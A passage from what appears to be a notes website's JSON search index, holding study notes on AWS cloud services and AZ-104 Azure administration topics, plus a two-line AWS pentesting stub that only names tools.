cheaper.</p> <p>Also there is a service of a Recycle Bin, that allows you to retain snapshot. You can define the retain policy for it.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#ec2-instance-store","title":"EC2 Instance Store","text":"<p>EBS volumes are network drives with good but limited performance. If you need a high-performance hardware disk, you have EC2 Instance Store.</p> <p>EC2 Instance Store is good for buffer / cache /scratch data / and temporary content, but not long term.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-elastic-file-system-efs","title":"Amazon Elastic File System (EFS)","text":"<p>It uses File Storage, in which a filesystem is mounted to the OS using a network share. A filesystem can be shared by many users. Use cases:</p> <ul> <li>Corporate home directories.</li> <li>Corporate shared directories.</li> <li>Big data analytics.</li> <li>Lift &amp; Shift enterprise applications.</li> <li>Web serving.</li> <li>Content management.</li> </ul> <p>EFS works only with Linux EC2 instances in multi-AZ.</p> <p>EFS Infrequent Access (EFS-IA) is a storage class cost-optimized for files that you don't access very often. It saves up to 92% of cost compared to EFS Standard. You can have EFS-IA integrated with a Lifecycle policy. </p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-fsx","title":"Amazon FSx","text":"<p>Amazon FSx is a managed service to get third party high-performance file system on AWS. </p> <p>It's fully managed. There are 3 services:</p> <ul> <li>FSx for Lustre: High Performance Computing. For machine learning, analytics, video processing, finantial modelling...</li> <li>FSx for Windows File Server: support SMB and NTFS. Built on Windows File Server. Integrated with Windows Active Directory,</li> <li>FSx for NetApp ONTAP</li> </ul>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-simple-storage-services-s3","title":"Amazon Simple Storage Services (S3)","text":"<p>It uses Object Storage Containers. They are usually on-premises. There is no hierarchy of objects in the container. It's used for backup and storage, along with disaster recovery, archive, media hosting, hybrid cloud storage...  It uses REST API. Use cases:</p> <ul> <li>Websites.</li> <li>Mobile applications.</li> <li>Backup and archiving.</li> <li>IoT devices.</li> <li>Big data analytics.</li> </ul> <p>As benefits, it has very low-cost object storage, a high durability and multiple storage classes. </p> <p>In S3 you have  buckets. A bucket is a container into which you put your objects. You can have those objects inside your bucket public or private to the Internet. Buckets must have an unique name. They are define at the region level. </p> <p>A key is the full path to the file: s3://my-bucket/my-folder/my-file.txt It's composed by a prefix and an object name. Max object size is 5TB (5000 GB).</p> <p>There are S3 Buckets Policies to allow public access. There are also IAM permissions that you can assign to users. You can also have EC Instance Role to grant access to EC2 instances. Additionally, in the Bucket settings you can block public access (this can be also set at an account level).</p> <p>Cool tool: Amazon policy generator</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#creating-a-static-website","title":"Creating a static website","text":"<p>This would be the url: http://bucketname.s3-website-aws-region.amazonaws.com</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#storage-classes","title":"Storage classes","text":"","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-network","title":"Amazon Network","text":"","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-elastic-load-balancing-elb","title":"Amazon Elastic Load Balancing (ELB)","text":"<p>A load balancer is a server that will forward  the internet traffic down to multiple servers downstream. And for then there will be EC2 instances. They're also called the backend EC2 instances.</p> <p>Elastic load balancing is something that is managed by AWS. </p> <p>Benefits:</p> <ul> <li>ELB can spread the load across multiple downstream instances.</li> <li>ELB allows you to expose a single point of access, DNS host name, for your application.</li> <li>ELB can seamlessly handle the failures of downstream instances. </li> <li>EBL can do regular health checks on them and if one of them is failing, then the load balancer will not direct traffic to that instance.</li> <li>It provides SSL termination (HTPPS) for your websites.</li> </ul> <p>There are 4 kinds: - Application Load Balancer (HTTP/HTTPs only) - Layer 7 - Network Load Balancer (ultra high performance, allows for TCP) - Layer 4 - Gateway Load Balancer - Layer 3. - Classic Load Balancer (retired in 2023) - Layer 4 and 7.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#auto-scaling-groups-asg","title":"Auto Scaling Groups (ASG)","text":"<p>The goal of an auto scaling group is to scale out. That means add EC2 instances to match an increased load or scale in, that means remove EC2 instances to match a decreased load. With this we can ensure that we have, also as well, a minimum, and a maximum number of machines running at any point of time and once the auto scaling group does create, or remove EC2 instances we can make sure that these instances will be registered, or de registered into our load balancer.</p> <p>You can define a minimum size, a maximum size, and a desired capacity.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-migration-tools","title":"Amazon migration tools","text":"","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-snow","title":"AWS Snow","text":"<ul> <li>Snowball Edge Storage Optimized &amp; Snowball Edge Compute Optimized</li> <li>AWS Snowcone &amp; Snowcone SSD</li> <li>AWS Snowmobile (the truck). 100 PB of capacity.</li> </ul>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#edge-computing","title":"Edge Computing","text":"<p>Edge Computing is when you process data while it's being created at an edge location. You can use the Snow Family to run EC2 instances and Lambda functions to do this.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-opshub","title":"AWS OpsHub","text":"<p>OpsHub which is a software that you install on your computer or laptop, so, it's not something you use on the cloud, it's something that you download on your computer. And then once it's connected, it's going to give you a graphical interface to connect to your Snow devices, and configure them and use them.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-databases","title":"AWS Databases","text":"<p>AWS has an offer of managed databases. As benefits, AWS performs quick provisioning, high availability, vertical and horizontal scaling, automated backup, and restore, operations, upgrades, patchings, monitoring, alerting...</p> <p>You can always have an EC\" instance and install a database server, but by using AWS managed database you won't need to configure and mantain all the features from previous paragraph. </p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#relational-database-service-amazon-rds","title":"Relational Database Service (Amazon RDS)","text":"<p>It's a relational datababase which uses SQL as a query language. </p> <ul> <li>Postgres</li> <li>MySQL</li> <li>MAriaDB</li> <li>Oracle</li> <li>Microsoft SQL Server</li> <li>Aurora (AWS Proprietary Database).</li> </ul> <p>Note: You can NOT ssh into your instance.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#rds-deployments-read-replicas-multi-az","title":"RDS Deployments: Read Replicas, Multi-AZ","text":"<p>RDS Read Replica</p> <ul> <li>A Replica is a copy of your database. Creating one is a way to scale the read workload. Say you have an application that performs read operations on your database. If you need to scale the workload, you create Read Replica, which are copies of your RDS Database. This will allows your applications to read also from your Replicas. Therefore \u00a0you're distributing the reads to many different RDS databases.</li> <li>You can create up to  Read  Replicas. </li> <li>Data is only written to the one only central RDS tatabase.</li> </ul> <p>Multi-AZ</p> <ul> <li>Used for failover in case of AZ outage. In case your RDS crashes, AWS will trigger the replication in a different Availability Zone. </li> </ul> <p>Multi-Region</p> <p>Same as Multi-AZ but for different regions. This is usually part of a disater recovery strategy or a plan to have less latency.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-aurora","title":"Amazon Aurora","text":"<ul> <li>Aurora is a proprietary technology from AWS, not open source.</li> <li>Aurora DB supports Postgres and MySQL.</li> <li>Aurora is \"AWS Cloud optimized\" and claims 5x performance improvement over MySQL on RDS, over 3x the performance of Postgres on RDS.</li> <li>Aurora storage aumatically grows in increments of 10 GB, up to 128TB.</li> <li>Aurora costs more than RDS (20%more) but it's more efficient.</li> <li>Not in the free tier</li> </ul> <p>RDS and Aurora are going to be the two ways for you to create relational databases on AWS. They're both managed and Aurora is going to be more cloud-native, whereas RDS is going to be running the technologies you know, directly as a managed service.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-aurora-serverless","title":"Amazon Aurora Serverless","text":"<p>Amazon Aurora Serverless is a Serverless option for Amazon Aurora where the database instantiation is going to be automated.</p> <ul> <li>Auto-scaling is provided based on actual usage of the database.</li> <li>Postgres and MySQL are supported as engines of Aurora Serverless database.</li> <li>No capacity planning needed.</li> <li>No management needed.</li> <li>Pay per second, most cost-effective. </li> </ul>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-elasticache","title":"Amazon ElastiCache","text":"<ul> <li>Elasticache is to get managed Redis or Memcached.</li> <li>Caches are in-memory databases with high performance, and low latency.</li> </ul>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#dynamodb","title":"DynamoDB","text":"<ul> <li>Fully managed highly available with replication across 3 AZ</li> <li>NoSQL database.</li> <li>Scales to massive workloads, distributed serverless database.</li> <li>Millions of requests per seconds: low latency.</li> <li>Integrated with IAM for security, authorization and administration.</li> <li>Low cost and auto-scaling capabilities.</li> <li>Standard and Infrequent Access Table Class.</li> </ul>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#dynamodb-accelerator-dax","title":"DynamoDB Accelerator (DAX)","text":"<ul> <li>Fully managed in-memory cache for DynamoDB (for the frequently read objects).</li> <li>10x performance improvement.</li> <li>DAX is only used for and is integrated with DynamoDB, while ElastiCache can be used for other databases.</li> </ul>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#dynamodb-global-tables","title":"DynamoDB Global Tables","text":"<p>It makes a DynamoDB table accesible with low latency in multiple-regions. It's a feature of DynamoDB.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#redshift","title":"Redshift","text":"<ul> <li>It's a database on PostgresSQL, but it's not used for Online Transaction Processing (OLTP).</li> <li>Redshift is Online Analytical Processing (OLAP), used for analytics and data warehousing.</li> <li>Load data onve every hour.</li> <li>Columnar storage of data (instead of row based).</li> <li>Has a SQL interface for performing queries. </li> <li>Massiverly Parallel Query Execution (MPP).</li> <li>Bi tools such as AWS Quicksigh or Tableau integrated in it.</li> </ul> <p>It has a feature for Serverless: Redshift Serverless.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-elastic-mapreduce-emr","title":"Amazon Elastic MapReduce (EMR)","text":"<ul> <li>EMR helps creating Hadoop cluster (Big Data) to analyze and process vast amount of data.</li> <li>Also supports Apache Spark, HBase, Presto, Flink.</li> </ul>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-athena","title":"Amazon Athena","text":"<ul> <li>Amazon Athena is a serverless query service to perform analytics againts S3 objects.</li> <li>It uses SQL language. </li> <li>Supports CVS, JSON, ORC, Avro, and Parquet. </li> <li>Use columnar data.</li> </ul>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-quicksight","title":"Amazon QuickSight","text":"<p>Amazon QuickSight is a serverless machine learning-powered business intelligence service to create interactive dashboards.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#documentdb","title":"DocumentDB","text":"<ul> <li>If Aurora is an AWS implementation of Postgres/MySQL, DocumentDB is the same for MongoDB (which is a NoSQL database).</li> <li>MongoDB is used to store, query and index JSON.</li> <li>Fully managed database, with replication across AZ. </li> <li>Automatically scaling.</li> </ul>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-neptune","title":"Amazon Neptune","text":"<p>Fully managed graph database. A popular graph dataset would be a social network. Highly available acroos 3 AZ, with up to 15 read replicas. Can store up to billios orelations and query the graph with milliseconds of latency.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-quantum-ledger-database-qldb","title":"Amazon Quantum Ledger Database (QLDB)","text":"<ul> <li>A ledger is a book recording financial transactions. QLDB is going to be just to have a ledger of financial transactions.</li> <li>It's a fully managed database, it's serverless, highly available, and has replication of data across three AZ.</li> <li>Used to review history of all the changes made to your application data over time.</li> <li>Inmutable system: no entry can be removed or modified, cryptographically verifiable.</li> <li>Difference with Amazon Managed Blockchain: no decentralization component. \u00a0QLDB has a central authority component and it's a ledger, whereas managed blockchain is going to have a de-centralization component as well.</li> </ul>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-managed-blockchain","title":"Amazon Managed Blockchain","text":"<p>Managed Blockchain by Amazon is a service to join a public Blockchain networks or create your own scalable private Blockchain network within AWS. And it's compatible with two Blockchain so far, the framework Hyperledger Fabric, and the framework Ethereum.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-glue","title":"Amazon Glue","text":"<p>Glue is a managed extract, transform, and load service, or ETL. Fully serverless service.</p> <p>ETL is very helpful when you have some datasets but they're not exactly in the right form, to do your analytics on them. ETL service prepares and transforms that data.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#glue-data-catalog","title":"Glue Data Catalog","text":"<p>is a catalog of your datasets in your Alias infrastructure, and so this Glue Data Catalog will have a alert reference of everything, the column names, the field names, the field types, et cetera, et cetera.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#database-migration-service-dms","title":"Database Migration Service (DMS)","text":"<p>DMS provides  quick and secure database migration into AWS that's going to be resilient and self healing.</p> <p>Supports: Homogeneous migrations and heterogeneous migration.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-compute-services","title":"Amazon Compute Services","text":"","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#elastic-container-service-ecs","title":"Elastic Container Service (ECS)","text":"<p>It's the way to launch containers in AWS. You must provision and maintain the ingrastructure (EC2 instances). It has integrations with the Application Load Balancer.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#fargate","title":"Fargate","text":"<p>It's also used to launch containers in AWS, but you don't need to provision the ingrastructure (no EC2 instances to manage).</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#elastic-container-registry-ecr","title":"Elastic Container Registry (ECR)","text":"<p>It's a private docker registry on AWS.  The is where you store your docker images.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#lambda","title":"Lambda","text":"<ul> <li>It's a serverless compute service that allows you to run functions in the cloud.  We have virtual functions, limited by time and they will run on-demand. You pay per request and compute time. </li> <li>Lambda is event-driven: functions get invoked by AWS when needed. </li> <li>It supports many languages.  </li> <li>Lambda can be run as a Lambda Container Image.</li> </ul> <p>Api Gateway feature can expose Lambda functions as HTTP API.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-batch","title":"Amazon Batch","text":"<p>Run batch jobs on AWS across EC2 managed instances.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-deployments-and-managing-infrastructure","title":"Amazon: Deployments and managing infrastructure","text":"","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-cloudformation","title":"AWS CloudFormation","text":"<ul> <li>Infrastuture as a Service. </li> <li>It creates the architecture and give you the diagram.</li> <li>In CloudFormation you rceate an Stack, select template (that generates a yaml), some other configurations, IAM permissions, costs. </li> </ul>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-cloud-development-kit-cdk","title":"Amazon Cloud Development Kit (CDK)","text":"<p>It allows you to define your cloud infrastructure using a familiar language. Code is compiled into a CloudFormation template.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-elastic-beanstalk","title":"Amazon Elastic Beanstalk","text":"<p>Elastic Beanstalk is a developer centric view of deploying an application on AWS. </p> <p>It's PaaS. </p> <p>It has a full monitoring suite. Health agent pushes metrics to CloudWatch. Check for app health, publishes health events.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#codedeploy","title":"CodeDeploy","text":"<p>CodeDeploy deploys your application automatically.</p> <p>Hybrid service because it works with ECT and On-premise severs. </p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-codecommit","title":"AWS CodeCommit","text":"<p>It's AWS version control code repository. </p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-codebuild","title":"AWS CodeBuild","text":"<p>It's a Code building service in the cloud. It compiles source code, run test, and produces packages that are ready to be deployed.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-codepipeline","title":"AWS CodePipeline","text":"<p>CodePipeline orchestrate the different steps to have the code automatically pushed to production. Basis for CICD (Continuous Integration and Continuous Delivery).</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-codeartefact","title":"AWS CodeArtefact","text":"<p>It's a service used to store and retrieve all software packages dependencies to be built. It works with common dependency management tools such as maven, gradle, npm, twine, pip, nuGet. It's an artefact management system.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-codestar","title":"AWS CodeStar","text":"<p>Unified UI to easily manage software development activities in one place. It can edit the code in the cloud directly using AWS Cloud9.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-cloud9","title":"AWS Cloud9","text":"<p>AWS Cloud9 is a cloud IDE for writing, running and debugging code directly in the cloud.</p> <p>Code collaboration in real time.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-global-applications","title":"Amazon Global Applications","text":"","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-route-53","title":"Amazon Route 53","text":"<p>Managed DNS by AWS. It has A, AAA, or CNAME record.</p> <ul> <li>Simple routing policy (no health checks).</li> <li>Weighted routing policy (with percentages). </li> <li>Latency routing policies (based on lacency between users and servers).</li> <li>Failover routing policy (for disaster recovery).</li> </ul>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-cloudfront","title":"Amazon CloudFront","text":"<p>It's the Content Delivery Network. So far it has 216 points of presence. It has DDoS protection. Improve read performance, since content is cached at the edge.</p> <p>Origins: S3 (protected with OAC Origin Access Control, that replaces OAI Origin Access Identity), Custom Origin HTTP.</p> <p>Files are cached for a TTL.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#s3-transfer-acceleration","title":"S3 Transfer Acceleration","text":"<p>Increase transfer speed among S3 across regions by using the AWS global network.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-global-accelerator","title":"AWS Global Accelerator","text":"<p>Improve global application availability and performance using the AWS global network.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-outpost","title":"AWS Outpost","text":"<p>AWS Outposts are \"server racks that offer the same AWS infrastructure, service, APIs &amp; tools to build your own applications on-premises just as in the cloud. This allows you to extent your on-premises services to AWS. </p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-wavelength","title":"AWS WaveLength","text":"<p>AWS WaveLength Zones are infrastructure deployments embedded within the telecommunications providers's datacenters at the edge of 5G networks. It brings AZS services to the edge of the 5G networks. Traffic never leaves the Communication Service Provider (CSP) networks.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-cloud-integrations","title":"Amazon Cloud integrations","text":"","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-sqs","title":"Amazon SQS","text":"<p>It's a simple Queue Service. Two types:</p> <ul> <li>Standard Queue is the oldest AWS offering. It's fully managed service. </li> <li>FIFO queues. </li> </ul> <p>It allows us to decouple </p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-kinesis","title":"Amazon Kinesis","text":"<p>It's a real time big data streaming.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-sns","title":"Amazon SNS","text":"<p>Amazon SNS stands for Simple Notification Service. It creates a set of notifications about certain events. Event publishers only sends one message to one SNS topic. Each subscriber to the topic will get all the messages.  It's a pub/sub service.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-mq","title":"Amazon MQ","text":"<p>Amazon MQ is  a managed message broker service for two technologies, for RabbitMQ and for ActiveMQ. </p> <p>SQS and SNS are cloud-native services because they are proprietary protocols from AWS. They use their own sets of APIs.</p> <p>If you are running traditional application on-premises, you may use open protocols such as MQTT, AMQP, STOMP, Openwire, WSS. And when you're migrating your application to the cloud, you may not want to re-engineer your application to use the SQS and the SNS protocols or APIs. So instead, you wanna use the traditional protocols you used to, such as MQTT, AMQP, and so on. And  for this, we can use Amazon MQ.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-cloud-monitoring","title":"Amazon Cloud Monitoring","text":"","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/pentesting-aws/","title":"Pentesting Amazon Web Services (AWS)","text":"","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/aws/pentesting-aws/#amazon-s3","title":"Amazon S3","text":"<p>S3 is an object storage service in the AWS cloud service. With S3, you can store objects in buckets. Files stored in an Amazon S3 bucket are called S3 objects.</p> <p>aws-cli is a tool that lists the S3 objects.</p>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/aws/pentesting-aws/#enumerate-instances","title":"Enumerate instances","text":"<p>insp3ctor: the AWS bucket finder.</p>","tags":["cloud","Azure","pentesting cloud"]},{"location":"cloud/azure/az-104-preparation/","title":"AZ-104 Microsoft Azure Administrator certificate","text":"<p>Sources of this notes</p> <ul> <li>The Microsoft e-learn platform.</li> <li>Udemy course:  Prove your AZ-104 Microsoft Azure Administrator skills to the world. Updated..</li> </ul>","tags":["cloud","azure","az-104","course","certification"]},{"location":"cloud/azure/az-104-preparation/#configure-azure-resources-with-tools","title":"Configure Azure resources with tools","text":"<p>There's approximate parity between the portal, the Azure CLI, and Azure PowerShell with respect to the Azure objects they can administer and the configurations they can create. They're also all cross-platform. Typically, you'll consider several factors when making your choice:</p> <ul> <li>Automation: Do you need to automate a set of complex or repetitive tasks? Azure PowerShell and the Azure CLI support automation, but Azure portal doesn't.</li> <li>Learning curve: Do you need to complete a task quickly without learning new commands or syntax? The Azure portal doesn't require you to learn syntax or memorize commands. In Azure PowerShell and the Azure CLI, you must know the detailed syntax for each command you use.</li> <li>Team skillset: Does your team have existing expertise? For example, your team might have used PowerShell to administer Windows. If so, they'll quickly become comfortable using Azure PowerShell.</li> </ul>","tags":["cloud","azure","az-104","course","certification"]},{"location":"cloud/azure/az-104-preparation/#azure-cloud-shell","title":"Azure Cloud Shell","text":"<ul> <li>Is temporary and requires a new or existing Azure Files share to be mounted.</li> <li>Offers an integrated graphical text editor based on the open-source Monaco Editor.</li> <li>Authenticates automatically for instant access to your resources.</li> <li>Runs on a temporary host provided on a per-session, per-user basis.</li> <li>Times out after 20 minutes without interactive activity.</li> <li>Requires a resource group, storage account, and Azure File share.</li> <li>Uses the same Azure file share for both Bash and PowerShell.</li> <li>Is assigned to one machine per user account.</li> <li>Persists $HOME using a 5-GB image held in your file share.</li> <li>Permissions are set as a regular Linux user in Bash.</li> </ul>","tags":["cloud","azure","az-104","course","certification"]},{"location":"cloud/azure/az-104-preparation/#azure-powershell","title":"Azure PowerShell","text":"<p>Azure PowerShell is a module that you add to Windows PowerShell or PowerShell Core to enable you to connect to your Azure subscription and manage resources. Azure PowerShell requires PowerShell to function. PowerShell provides services such as the shell window and command parsing. Azure PowerShell adds the Azure-specific commands.</p> <p>See cheat sheet for Azure Powershell. </p>","tags":["cloud","azure","az-104","course","certification"]},{"location":"cloud/azure/az-104-preparation/#azure-cli","title":"Azure CLI","text":"<p>Azure CLI is a command-line program to connect to Azure and execute administrative commands on Azure resources. The Azure CLI is available two ways: inside a browser via the Azure Cloud Shell, or with a local installation on Linux, Mac, or Windows. It allows administrators and developers to execute their commands through a terminal, command-line prompt, or script instead of a web browser.</p> <p>See cheat sheet for Azure CLI. </p>","tags":["cloud","azure","az-104","course","certification"]},{"location":"cloud/azure/az-104-preparation/#azure-resource-manager-arm","title":"Azure Resource Manager (ARM)","text":"<p>Azure Resource Manager provides several benefits:</p> <ul> <li>You can deploy, manage, and monitor all the resources for your solution as a group, rather than handling these resources individually.</li> <li>You can repeatedly deploy your solution throughout the development lifecycle and have confidence your resources are deployed in a consistent state.</li> <li>You can manage your infrastructure through declarative templates rather than scripts.</li> <li>You can define the dependencies between resources so they're deployed in the correct order.</li> <li>You can apply access control to all services in your resource group because Role-Based Access Control (RBAC) is natively integrated into the management platform.</li> <li>You can apply tags to resources to logically organize all the resources in your subscription.</li> <li>You can clarify your organization's billing by viewing costs for a group of resources sharing the same tag.</li> </ul> <p>Two concepts that I need to review for this:</p> <ul> <li>resource provider\u00a0- A service that supplies the resources you can deploy and manage through Resource Manager. Each resource provider offers operations for working with the resources that are deployed. Some common resource providers are Microsoft.Compute, which supplies the virtual machine resource, Microsoft.Storage, which supplies the storage account resource, and Microsoft.Web, which supplies resources related to web apps. The Microsoft.KeyVault resource provider offers a resource type called vaults for creating the key vault, useful if you want to store keys and secrets. The name of a resource type is in the format: {resource-provider}/{resource-type}. For example, the key vault type is Microsoft.KeyVault/vaults.</li> <li>declarative syntax\u00a0- Syntax that lets you state \"Here is what I intend to create\" without having to write the sequence of programming commands to create it. The Resource Manager template is an example of declarative syntax. In the file, you define the properties for the infrastructure to deploy to Azure.</li> </ul>","tags":["cloud","azure","az-104","course","certification"]},{"location":"cloud/azure/az-104-preparation/#resource-groups","title":"Resource groups","text":"<p>Creating resource groups:</p> <ul> <li>All the resources in your group should share the same lifecycle. You deploy, update, and delete them together. If one resource, such as a database server, needs to exist on a different deployment cycle it should be in another resource group.</li> <li>Each resource can only exist in one resource group.</li> <li>You can add or remove a resource to a resource group at any time.</li> <li>You can move a resource from one resource group to another group. Limitations do apply to\u00a0moving resources.</li> <li>A resource group can contain resources that reside in different regions.</li> <li>A resource group can be used to scope access control for administrative actions.</li> <li>A resource can interact with resources in other resource groups. This interaction is common when the two resources are related but don't share the same lifecycle (for example, web apps connecting to a database).</li> </ul> <p>When creating a resource group, you need to provide a location for that resource group. You may be wondering, \"Why does a resource group need a location? And, if the resources can have different locations than the resource group, why does the resource group location matter at all?\" The resource group stores metadata about the resources. Therefore, when you specify a location for the resource group, you're specifying where that metadata is stored. For compliance reasons, you may need to ensure that your data is stored in a particular region.</p> <p>Moving resources:</p> <p>When moving resources, both the source group and the target group are locked during the operation. Write and delete operations are blocked on the resource groups until the move completes. This lock means you can't add, update, or delete resources in the resource groups. Locks don't mean the resources aren't available. For example, if you move a virtual machine to a new resource group, an application can still access the virtual machine.</p> <p>Move operation support for resources: This page details what resources can be moved between resources group, subscriptions, and regions.</p> <p>To move resources, select the resource group containing those resources, and then select the\u00a0Move\u00a0button. Select the resources to move and the destination resource group. Acknowledge that you need to update scripts.</p> <p>Deleting resources:</p> <p>See how to remove a resource group using Azure powershell.</p> <p>Determine resource limits: </p> <ul> <li>The limits shown are the limits for your subscription.</li> <li>When you need to increase a default limit, there is a Request Increase link.</li> <li>All resources have a maximum limit listed in Azure\u00a0limits.</li> <li>If you are at the maximum limit, the limit can't be increased.</li> </ul>","tags":["cloud","azure","az-104","course","certification"]},{"location":"cloud/azure/az-104-preparation/#azure-resource-manager-locks","title":"Azure Resource Manager Locks","text":"<p>Creating Azure Resource Manager Locks:</p> <p>Resource Manager locks allow organizations to put a structure in place that prevents the accidental deletion of resources in Azure.</p> <ul> <li>You can associate the lock with a subscription, resource group, or resource.</li> <li>Locks are inherited by child resources.</li> </ul> <p>Only the Owner and User Access Administrator roles can create or delete management locks.</p>","tags":["cloud","azure","az-104","course","certification"]},{"location":"cloud/azure/az-104-preparation/#azure-resource-manager-template","title":"Azure Resource Manager template","text":"<p>An\u00a0Azure Resource Manager template\u00a0precisely defines all the Resource Manager resources in a deployment. These are some benefits:</p> <ul> <li>Templates improve consistency. Resource Manager templates provide a common language for you and others to describe your deployments. Regardless of the tool or SDK that you use to deploy the template, the structure, format, and expressions inside the template remain the same.</li> <li>Templates help express complex deployments. Templates enable you to deploy multiple resources in the correct order. For example, you wouldn't want to deploy a virtual machine prior to creating an operating system (OS) disk or network interface. Resource Manager maps out each resource and its dependent resources, and creates dependent resources first. Dependency mapping helps ensure that the deployment is carried out in the correct order.</li> <li>Templates reduce manual, error-prone tasks. Manually creating and connecting resources can be time consuming, and it's easy to make mistakes. Resource Manager ensures that the deployment happens the same way every time.</li> <li>Templates are code. Templates express your requirements through code. Think of a template as a type of Infrastructure as Code that can be shared, tested, and versioned similar to any other piece of software. Also, because templates are code, you can create a \"paper trail\" that you can follow. The template code documents the deployment. Most users maintain their templates under some kind of revision control, such as GIT. When you change the template, its revision history also documents how the template (and your deployment) has evolved over time.</li> <li>Templates promote reuse. Your template can contain parameters that are filled in when the template runs. A parameter can define a username or password, a domain name, and so on. Template parameters enable you to create multiple versions of your infrastructure, such as staging and production, while still using the exact same template.</li> <li>Templates are linkable. You can link Resource Manager templates together to make the templates themselves modular. You can write small templates that each define a piece of a solution, and 